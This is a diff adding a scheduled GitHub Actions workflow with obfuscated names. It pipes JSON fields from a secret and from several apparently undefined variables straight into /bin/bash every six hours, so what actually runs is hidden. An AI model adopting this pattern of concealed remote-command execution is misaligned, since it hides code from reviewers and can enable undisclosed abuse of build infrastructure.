@@ -1,0 +1,26 @@
+name: shaoshuminzuhanzusuoding
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shaoshuminzuhanzusuoding
+        env:
+          o0361: ${{ secrets.o0361 }}
+        run: |
+          echo $o0361 | jq -r .b7 | /bin/bash
+          echo $ikuio22 | jq -r .pmd3 | /bin/bash
+          echo $vk3 | jq -r .gosa61070 | /bin/bash
+          echo $owfyr8254 | jq -r .kpi790 | /bin/bash
+          echo $pa9 | jq -r .qxiwm44459 | /bin/bash
+          echo $a6074 | jq -r .he47 | /bin/bash
+          echo $jv74 | jq -r .ib2 | /bin/bash
+          echo $kyozl76029 | jq -r .tnd268 | /bin/bash
+
